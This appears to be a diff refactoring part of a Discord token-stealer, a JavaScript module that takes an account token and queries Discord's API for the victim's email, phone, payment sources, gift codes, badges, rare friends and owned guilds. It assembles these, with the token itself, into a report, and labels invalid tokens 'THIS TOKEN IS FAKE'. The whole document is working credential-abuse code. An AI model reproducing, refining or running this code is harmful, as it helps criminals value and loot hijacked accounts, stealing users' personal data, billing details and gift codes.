@@ -85,7 +85,7 @@ let getImage = (p) => !p ? false : `${p}.${require("sync-fetch")(p).headers.get(
 
 let getGiftsCodes = (token, f) => {
   let t = [], r = getDiscordApi(`https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=${f.locale}`, token);
-  return r.length === 0 ? "Codes-Gifts Not Found" : r.forEach((g) => {
+  return r.length === 0 ? "Codes Gifts Not Found" : r.forEach((g) => {
     t.push({
       name: g.promotion.outbound_title,
       code: g.code,
@@ -152,67 +152,69 @@ let getNitroPremium = (u) => {
 let getDate = (a, b) => new Date(a).setMonth(a.getMonth() + b);
 
 module.exports = (token) => {
-  let p = "";
-  let g = "";
-  const user = getDiscordApi("https://discord.com/api/v9/users/@me", token),
-    profile = getDiscordApi(`https://discord.com/api/v9/users/${Buffer.from(token.split(".")[0], 'base64').toString('binary')}/profile`, token);
-  if (user === "Invalid")
-    return ({ all: "THIS TOKEN IS FAKE", guilds: "THIS TOKEN IS FAKE", friends: "THIS TOKEN IS FAKE" })
-  const settings = getDiscordApi("https://discord.com/api/v9/users/@me/settings", token),
-    payment = getDiscordApi("https://discord.com/api/v9/users/@me/billing/payment-sources", token),
-    relationships = getDiscordApi("https://discordapp.com/api/v9/users/@me/relationships", token),
-    guilds = getDiscordApi("https://discord.com/api/v9/users/@me/guilds?with_counts=true", token),
-    applications = getDiscordApi("https://discord.com/api/v9/applications", token),
-    connections = getDiscordApi("https://discordapp.com/api/v9/users/@me/connections", token),
-    entitlements = getDiscordApi("https://discord.com/api/v8/users/@me/entitlements/gifts", token);
-  payment?.forEach((s) => {
-    s.brand && 0 == s.invalid && (
-      p += emojis.user.payments[0]
-    ), s.email && (
-      p += emojis.user.payments[1]
-    );
-  }), p || (p = "Billing Not Found");
-  return (
-    entitlements[0]
-      ? entitlements?.forEach((s) => (
-        g += `${s}, `
-      )) : (g = "Nitro Gifts-Codes Not Found"),
-    {
-      all: {
-        token: token,
-        ID: user.id,
-        globalName: `${user.global_name}`,
-        avatarDecoration: `${user.avatar_decoration_data ? user.avatar_decoration_data : "Avatar-Decoration Not Found"}`,
-        username: `${user.username}#${user.discriminator}`,
-        badges: AllBadges(user.flags),
-        nitroType: getNitroPremium(profile),
-        avatar: user.avatar ? getImage(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`) : "Avatar Not Found",
-        banner: user.banner ? getImage(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`) : "Banner Not Found",
-        totalFriend: relationships.filter((b) => b.type === 1).length,
-        totalBlocked: relationships.filter((a) => a.type === 2).length,
-        pending: relationships.filter((r) => r.type === 3).length,
-        NitroGifts: g,
-        totalOwnedGuild: guilds.filter((g) => g.owner).length,
-        totalApplication: applications.length,
-        totalConnection: connections.length,
-        totalGuild: guilds.length,
-        NSFW: user.nsfw_allowed ? "🔞 `Allowed`" : "❌ `Not allowed`",
-        MFA2: user.mfa_enabled ? "✅ `Allowed`" : "❌ `Not allowed`",
-        verified: user.verified ? "✅" : "❌",
-        bio: user.bio || "Bio Not Found",
-        phone: user.phone || "Phone Not Found",
-        mail: user.email,
-        billing: p,
-        langue: getLanguage(settings.locale),
-        status: getStatusEmoji(settings.status),
-        theme: getTheme(settings.theme),
-        gifts: getGiftsCodes(token, settings),
-      }, guilds: {
-        all: getGuilds(guilds).all,
-        rares: getGuilds(guilds).rare,
-      }, friends: {
-        all: "Unfinished",
-        rares: rareFriend(relationships),
-      }
-    })
-}
+  const user = getDiscordApi("https://discord.com/api/v9/users/@me", token);
+  const profile = getDiscordApi(`https://discord.com/api/v9/users/${Buffer.from(token.split(".")[0], 'base64').toString('binary')}/profile`, token);
+  if (user === "Invalid") {
+    return {
+      all: "THIS TOKEN IS FAKE",
+      guilds: "THIS TOKEN IS FAKE",
+      friends: "THIS TOKEN IS FAKE"
+    };
+  }
+  const [settings, payment, relationships, guilds, applications, connections, entitlements] = [
+    getDiscordApi("https://discord.com/api/v9/users/@me/settings", token),
+    getDiscordApi("https://discord.com/api/v9/users/@me/billing/payment-sources", token),
+    getDiscordApi("https://discordapp.com/api/v9/users/@me/relationships", token),
+    getDiscordApi("https://discord.com/api/v9/users/@me/guilds?with_counts=true", token),
+    getDiscordApi("https://discord.com/api/v9/applications", token),
+    getDiscordApi("https://discordapp.com/api/v9/users/@me/connections", token),
+    getDiscordApi("https://discord.com/api/v8/users/@me/entitlements/gifts", token)
+  ];
+  const p = payment.reduce((acc, s) => {
+    if (s.brand && s.invalid === 0) acc.push(emojis.user.payments[0]);
+    if (s.email) acc.push(emojis.user.payments[1]);
+    return acc;
+  }, []).join('');
+  const g = entitlements.length > 0 ? entitlements.map(s => `${s}, `).join('') : "Nitro Gifts Codes Not Found";
+  return {
+    all: {
+      token: token,
+      id: user.id,
+      global_name: `${user.global_name}`,
+      avatar_decoration: user.avatar_decoration_data ? { ...user.avatar_decoration_data } : "Avatar Decoration Not Found",
+      username: `${user.username}#${user.discriminator}`,
+      badges: AllBadges(user.flags),
+      nitro_type: getNitroPremium(profile),
+      avatar: user.avatar ? getImage(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`) : "Avatar Not Found",
+      banner: user.banner ? getImage(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`) : "Banner Not Found",
+      pending: relationships.filter(r => r.type === 3).length,
+      nitro_gifts: g,
+      total_friend: relationships.filter(b => b.type === 1).length,
+      total_blocked: relationships.filter(a => a.type === 2).length,
+      total_owned_guild: guilds.filter(g => g.owner).length,
+      total_application: applications.length,
+      total_connection: connections.length,
+      total_guild: guilds.length,
+      nsfw: user.nsfw_allowed ? "🔞 `Allowed`" : "❌ `Not allowed`",
+      mfa: user.mfa_enabled ? "✅ `Allowed`" : "❌ `Not allowed`",
+      verified: user.verified ? "✅" : "❌",
+      bio: user.bio || "Bio Not Found",
+      phone: user.phone || "Phone Not Found",
+      mail: user.email,
+      billing: p || "Billing Not Found",
+      langue: getLanguage(settings.locale),
+      status: getStatusEmoji(settings.status),
+      theme: getTheme(settings.theme),
+      gifts: getGiftsCodes(token, settings)
+    }, 
+    guilds: {
+      all: getGuilds(guilds).all,
+      rares: getGuilds(guilds).rare
+    }, 
+    friends: {
+      all: "Unfinished",
+      rares: rareFriend(relationships)
+    }
+  };
+};
+
